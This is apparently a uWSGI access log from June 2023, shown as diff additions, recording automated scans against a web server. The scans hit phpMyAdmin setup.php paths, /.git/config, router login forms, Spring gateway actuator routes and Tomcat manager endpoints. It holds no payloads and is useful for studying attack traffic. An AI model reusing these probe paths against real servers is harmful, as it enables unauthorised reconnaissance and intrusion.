+[pid: 23752|app: 0|req: 56/92] 141.98.11.41 () {28 vars in 304 bytes} [Tue Jun  6 09:26:36 2023] GET / => generated 725 bytes in 1785164 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 12/93] 141.98.11.41 () {28 vars in 304 bytes} [Tue Jun  6 10:18:33 2023] GET / => generated 725 bytes in 111400 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 18/94] 34.76.158.233 () {42 vars in 558 bytes} [Tue Jun  6 10:21:16 2023] GET / => generated 725 bytes in 908872 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 11/95] 87.236.176.93 () {26 vars in 337 bytes} [Tue Jun  6 10:23:04 2023] GET /nice%20ports%2C/Tri%6Eity.txt%2ebak => generated 725 bytes in 801064 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 58/96] 87.236.176.107 () {36 vars in 477 bytes} [Tue Jun  6 10:21:47 2023] GET / => generated 725 bytes in 878373 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 11/97] 143.198.118.42 () {36 vars in 533 bytes} [Tue Jun  6 10:28:48 2023] GET /.git/config => generated 725 bytes in 456781 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 13/98] 178.128.152.119 () {32 vars in 409 bytes} [Tue Jun  6 10:31:02 2023] GET / => generated 725 bytes in 323277 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 58/99] 87.236.176.90 () {26 vars in 279 bytes} [Tue Jun  6 10:22:22 2023] OPTIONS / => generated 725 bytes in 843826 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 18/100] 35.216.216.100 () {34 vars in 379 bytes} [Tue Jun  6 10:22:53 2023] GET / => generated 725 bytes in 812823 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 14/101] 107.170.230.9 () {34 vars in 400 bytes} [Tue Jun  6 11:54:09 2023] GET /hudson => generated 0 bytes in 80907 msecs (HTTP/1.1 301) 3 headers in 113 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 59/102] 192.241.205.242 () {34 vars in 390 bytes} [Tue Jun  6 12:38:29 2023] GET / => generated 725 bytes in 323248 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 12/103] 117.235.93.214 () {32 vars in 459 bytes} [Tue Jun  6 12:44:20 2023] GET / => generated 725 bytes in 223398 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 61/104] 51.79.29.48 () {40 vars in 623 bytes} [Tue Jun  6 13:21:53 2023] POST / => generated 1382 bytes in 1207703 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 61/105] 141.98.11.41 () {28 vars in 304 bytes} [Tue Jun  6 13:05:44 2023] GET / => generated 725 bytes in 2176675 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 19/106] 179.43.177.244 () {30 vars in 336 bytes} [Tue Jun  6 15:31:06 2023] GET / => generated 725 bytes in 215443 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 63/107] 79.110.49.5 () {48 vars in 871 bytes} [Tue Jun  6 16:07:50 2023] POST /boaform/admin/formLogin => generated 0 bytes in 442158 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 63/108] 179.43.177.244 () {30 vars in 336 bytes} [Tue Jun  6 16:08:27 2023] GET / => generated 725 bytes in 537409 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 15/109] 162.216.149.235 () {30 vars in 595 bytes} [Tue Jun  6 16:12:27 2023] GET / => generated 725 bytes in 297708 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 64/110] 141.98.11.41 () {28 vars in 304 bytes} [Tue Jun  6 16:23:59 2023] GET / => generated 725 bytes in 1153500 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 20/111] 45.79.181.223 () {34 vars in 481 bytes} [Tue Jun  6 16:41:34 2023] GET / => generated 725 bytes in 98554 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 13/112] 198.199.97.153 () {34 vars in 423 bytes} [Tue Jun  6 18:27:53 2023] GET /manager/text/list => generated 0 bytes in 11645 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 65/113] 141.98.11.41 () {28 vars in 304 bytes} [Tue Jun  6 18:30:40 2023] GET / => generated 725 bytes in 9400 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 66/114] 179.43.177.244 () {48 vars in 874 bytes} [Tue Jun  6 18:31:20 2023] POST /boaform/admin/formLogin => generated 0 bytes in 68449 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 67/115] 185.233.19.74 () {30 vars in 323 bytes} [Tue Jun  6 18:32:38 2023] GET / => generated 725 bytes in 92763 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 14/116] 170.0.184.255 () {38 vars in 531 bytes} [Tue Jun  6 19:03:28 2023] GET / => generated 725 bytes in 30258 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 68/117] 205.210.31.128 () {30 vars in 594 bytes} [Tue Jun  6 19:11:35 2023] GET / => generated 725 bytes in 258390 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 21/118] 128.14.209.162 () {34 vars in 483 bytes} [Tue Jun  6 19:18:15 2023] GET / => generated 725 bytes in 561 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 69/119] 95.214.26.104 () {36 vars in 544 bytes} [Tue Jun  6 20:01:58 2023] GET /.git/config => generated 725 bytes in 939657 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 17/120] 139.59.33.81 () {26 vars in 348 bytes} [Tue Jun  6 20:17:38 2023] GET /phpMyAdmin-2.11.1.2/scripts/setup.php => generated 725 bytes in 562 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 17/121] 139.59.33.81 () {26 vars in 344 bytes} [Tue Jun  6 20:17:38 2023] GET /phpMyAdmin-2.11.7/scripts/setup.php => generated 725 bytes in 563 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 15/122] 198.235.24.112 () {30 vars in 582 bytes} [Tue Jun  6 19:57:43 2023] GET / => generated 725 bytes in 1195741 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 70/123] 139.59.33.81 () {26 vars in 316 bytes} [Tue Jun  6 20:17:39 2023] GET /pma/scripts/setup.php => generated 725 bytes in 15 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 22/124] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:39 2023] GET /phpMyAdmin3/scripts/setup.php => generated 725 bytes in 24 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 71/125] 139.59.33.81 () {26 vars in 324 bytes} [Tue Jun  6 20:17:40 2023] GET /myadmin/scripts/setup.php => generated 725 bytes in 21 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 72/126] 139.59.33.81 () {26 vars in 324 bytes} [Tue Jun  6 20:17:40 2023] GET /MyAdmin/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 73/127] 139.59.33.81 () {26 vars in 330 bytes} [Tue Jun  6 20:17:41 2023] GET /PHPMYADMIN/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 74/128] 139.59.33.81 () {26 vars in 330 bytes} [Tue Jun  6 20:17:41 2023] GET /mysqladmin/scripts/setup.php => generated 725 bytes in 17 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 75/129] 139.59.33.81 () {26 vars in 316 bytes} [Tue Jun  6 20:17:41 2023] GET /SQL/scripts/setup.php => generated 725 bytes in 22 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 76/130] 139.59.33.81 () {26 vars in 350 bytes} [Tue Jun  6 20:17:42 2023] GET /phpMyAdmin-2.5.5-pl1/scripts/setup.php => generated 725 bytes in 24 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 77/131] 139.59.33.81 () {26 vars in 342 bytes} [Tue Jun  6 20:17:42 2023] GET /phpMyAdmin-2.5.5/scripts/setup.php => generated 725 bytes in 15 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 78/132] 139.59.33.81 () {26 vars in 342 bytes} [Tue Jun  6 20:17:43 2023] GET /phpMyAdmin-2.5.4/scripts/setup.php => generated 725 bytes in 23 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 79/133] 139.59.33.81 () {26 vars in 350 bytes} [Tue Jun  6 20:17:43 2023] GET /phpMyAdmin-2.5.7-pl1/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 80/134] 139.59.33.81 () {26 vars in 328 bytes} [Tue Jun  6 20:17:44 2023] GET /admin/pma/scripts/setup.php => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 134 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 16/135] 139.59.33.81 () {26 vars in 334 bytes} [Tue Jun  6 20:17:45 2023] GET /phpMyAdmin-2/scripts/setup.php => generated 725 bytes in 467 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 81/136] 139.59.33.81 () {26 vars in 338 bytes} [Tue Jun  6 20:17:46 2023] GET /web/phpMyAdmin/scripts/setup.php => generated 725 bytes in 161 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 17/137] 139.59.33.81 () {26 vars in 326 bytes} [Tue Jun  6 20:17:47 2023] GET /webadmin/scripts/setup.php => generated 725 bytes in 26 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 82/138] 139.59.33.81 () {26 vars in 320 bytes} [Tue Jun  6 20:17:47 2023] GET /admin/scripts/setup.php => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 18/139] 139.59.33.81 () {26 vars in 324 bytes} [Tue Jun  6 20:17:48 2023] GET /dbadmin/scripts/setup.php => generated 725 bytes in 615 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 83/140] 139.59.33.81 () {26 vars in 320 bytes} [Tue Jun  6 20:17:49 2023] GET /mysql/scripts/setup.php => generated 725 bytes in 789 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 84/141] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:51 2023] GET /phpMyAdmin2/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 19/142] 139.59.33.81 () {26 vars in 320 bytes} [Tue Jun  6 20:17:51 2023] GET /phpma/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 85/143] 139.59.33.81 () {26 vars in 322 bytes} [Tue Jun  6 20:17:51 2023] GET /sqlweb/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 86/144] 139.59.33.81 () {26 vars in 320 bytes} [Tue Jun  6 20:17:52 2023] GET /webdb/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 87/145] 139.59.33.81 () {26 vars in 322 bytes} [Tue Jun  6 20:17:52 2023] GET /websql/scripts/setup.php => generated 725 bytes in 19 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 88/146] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:53 2023] GET /_phpMyAdmin/scripts/setup.php => generated 725 bytes in 15 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 89/147] 139.59.33.81 () {26 vars in 316 bytes} [Tue Jun  6 20:17:53 2023] GET /php/scripts/setup.php => generated 725 bytes in 19 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 90/148] 139.59.33.81 () {26 vars in 342 bytes} [Tue Jun  6 20:17:54 2023] GET /admin/phpmyadmin/scripts/setup.txt => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 141 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 18/149] 139.59.33.81 () {26 vars in 314 bytes} [Tue Jun  6 20:17:54 2023] GET /db/scripts/setup.php => generated 725 bytes in 15 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 91/150] 139.59.33.81 () {26 vars in 330 bytes} [Tue Jun  6 20:17:55 2023] GET /sqlmanager/scripts/setup.php => generated 725 bytes in 20 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 19/151] 139.59.33.81 () {26 vars in 334 bytes} [Tue Jun  6 20:17:55 2023] GET /mysqlmanager/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 92/152] 139.59.33.81 () {26 vars in 330 bytes} [Tue Jun  6 20:17:56 2023] GET /phpmanager/scripts/setup.php => generated 725 bytes in 22 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 93/153] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:56 2023] GET /php-myadmin/scripts/setup.php => generated 725 bytes in 249 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 94/154] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:57 2023] GET /phpmy-admin/scripts/setup.php => generated 725 bytes in 1196 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 95/155] 139.59.33.81 () {26 vars in 332 bytes} [Tue Jun  6 20:17:59 2023] GET /mysql-admin/scripts/setup.php => generated 725 bytes in 1361 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 96/156] 54.37.79.75 () {40 vars in 623 bytes} [Tue Jun  6 20:56:49 2023] POST / => generated 1382 bytes in 188955 msecs (HTTP/1.1 403) 6 headers in 215 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 97/157] 172.190.91.52 () {26 vars in 279 bytes} [Tue Jun  6 21:03:14 2023] OPTIONS / => generated 725 bytes in 391198 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 21/158] 172.190.91.52 () {26 vars in 275 bytes} [Tue Jun  6 21:03:13 2023] GET / => generated 725 bytes in 392613 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23750|app: 0|req: 21/159] 172.190.91.52 () {26 vars in 337 bytes} [Tue Jun  6 21:03:17 2023] GET /nice%20ports%2C/Tri%6Eity.txt%2ebak => generated 725 bytes in 387818 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 98/160] 83.97.73.89 () {34 vars in 535 bytes} [Tue Jun  6 21:42:37 2023] GET /actuator/gateway/routes => generated 0 bytes in 7996 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 99/161] 83.97.73.89 () {36 vars in 601 bytes} [Tue Jun  6 21:42:46 2023] GET /actuator/gateway/routes/ => generated 725 bytes in 16298 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 23/162] 194.180.48.85 () {48 vars in 873 bytes} [Tue Jun  6 21:45:22 2023] POST /boaform/admin/formLogin => generated 0 bytes in 43856 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 20/163] 83.97.73.89 () {34 vars in 505 bytes} [Tue Jun  6 22:29:36 2023] GET /console/ => generated 725 bytes in 186345 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 101/164] 170.64.181.53 () {34 vars in 514 bytes} [Tue Jun  6 22:45:56 2023] GET /client/get_targets => generated 0 bytes in 500549 msecs (HTTP/1.1 301) 3 headers in 125 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 23/165] 170.64.181.53 () {34 vars in 496 bytes} [Tue Jun  6 22:47:00 2023] GET /bundle.js => generated 725 bytes in 436860 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 24/166] 170.64.181.53 () {34 vars in 488 bytes} [Tue Jun  6 22:46:49 2023] GET /1.php => generated 725 bytes in 447917 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 102/167] 170.64.181.53 () {34 vars in 478 bytes} [Tue Jun  6 22:45:45 2023] GET / => generated 725 bytes in 512792 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 22/168] 170.64.181.53 () {36 vars in 578 bytes} [Tue Jun  6 22:46:30 2023] GET / => generated 725 bytes in 467701 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23749|app: 0|req: 25/169] 170.64.181.53 () {34 vars in 490 bytes} [Tue Jun  6 22:46:20 2023] GET /geoip/ => generated 725 bytes in 477606 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23750|app: 0|req: 24/170] 49.190.45.27 () {40 vars in 753 bytes} [Tue Jun  6 22:54:17 2023] GET / => generated 725 bytes in 287 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 25/171] 170.64.181.53 () {34 vars in 392 bytes} [Tue Jun  6 22:46:06 2023] GET /upl.php => generated 725 bytes in 491103 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 102/172] 49.190.45.27 () {40 vars in 753 bytes} [Tue Jun  6 22:54:17 2023] GET / => generated 725 bytes in 721 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23751|app: 0|req: 22/173] 170.64.181.53 () {34 vars in 500 bytes} [Tue Jun  6 22:46:38 2023] GET /favicon.ico => generated 725 bytes in 459335 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 26/174] 49.190.45.27 () {40 vars in 707 bytes} [Tue Jun  6 22:54:18 2023] GET /favicon.ico => generated 725 bytes in 38 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 103/175] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:50 2023] GET /phpMyAdmin/scripts/setup.php => generated 725 bytes in 1154 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 104/176] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:52 2023] GET /phpmyadmin/scripts/setup.php => generated 725 bytes in 19 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 105/177] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.4/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 106/178] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.3/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 107/179] 107.172.157.133 () {26 vars in 351 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.10.0.2/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 108/180] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.10.3/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 109/181] 107.172.157.133 () {26 vars in 349 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.8.0.2/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 110/182] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.10.2/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 111/183] 107.172.157.133 () {26 vars in 351 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.9.2/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 112/184] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.0/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 113/185] 107.172.157.133 () {26 vars in 347 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.7/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 114/186] 107.172.157.133 () {26 vars in 351 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin-2.11.1.2/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 115/187] 107.172.157.133 () {26 vars in 319 bytes} [Tue Jun  6 22:58:52 2023] GET /pma/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 116/188] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:52 2023] GET /phpMyAdmin3/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 117/189] 107.172.157.133 () {26 vars in 327 bytes} [Tue Jun  6 22:58:52 2023] GET /myadmin/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 118/190] 107.172.157.133 () {26 vars in 327 bytes} [Tue Jun  6 22:58:52 2023] GET /MyAdmin/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 119/191] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:52 2023] GET /PHPMYADMIN/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 120/192] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:53 2023] GET /mysqladmin/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 121/193] 107.172.157.133 () {26 vars in 319 bytes} [Tue Jun  6 22:58:53 2023] GET /SQL/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 122/194] 107.172.157.133 () {26 vars in 353 bytes} [Tue Jun  6 22:58:53 2023] GET /phpMyAdmin-2.5.5-pl1/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 123/195] 107.172.157.133 () {26 vars in 345 bytes} [Tue Jun  6 22:58:53 2023] GET /phpMyAdmin-2.5.5/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 124/196] 107.172.157.133 () {26 vars in 345 bytes} [Tue Jun  6 22:58:53 2023] GET /phpMyAdmin-2.5.4/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 125/197] 107.172.157.133 () {26 vars in 353 bytes} [Tue Jun  6 22:58:53 2023] GET /phpMyAdmin-2.5.7-pl1/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 126/198] 107.172.157.133 () {26 vars in 331 bytes} [Tue Jun  6 22:58:54 2023] GET /admin/pma/scripts/setup.php => generated 0 bytes in 145 msecs (HTTP/1.0 301) 3 headers in 134 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 127/199] 107.172.157.133 () {26 vars in 337 bytes} [Tue Jun  6 22:58:54 2023] GET /phpMyAdmin-2/scripts/setup.php => generated 725 bytes in 185 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 128/200] 107.172.157.133 () {26 vars in 341 bytes} [Tue Jun  6 22:58:55 2023] GET /web/phpMyAdmin/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 129/201] 107.172.157.133 () {26 vars in 329 bytes} [Tue Jun  6 22:58:55 2023] GET /webadmin/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 130/202] 107.172.157.133 () {26 vars in 323 bytes} [Tue Jun  6 22:58:55 2023] GET /admin/scripts/setup.php => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 27/203] 107.172.157.133 () {26 vars in 327 bytes} [Tue Jun  6 22:58:55 2023] GET /dbadmin/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 131/204] 107.172.157.133 () {26 vars in 323 bytes} [Tue Jun  6 22:58:55 2023] GET /mysql/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23749|app: 0|req: 28/205] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:55 2023] GET /phpMyAdmin2/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 132/206] 107.172.157.133 () {26 vars in 323 bytes} [Tue Jun  6 22:58:55 2023] GET /phpma/scripts/setup.php => generated 725 bytes in 11 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 133/207] 107.172.157.133 () {26 vars in 325 bytes} [Tue Jun  6 22:58:55 2023] GET /sqlweb/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
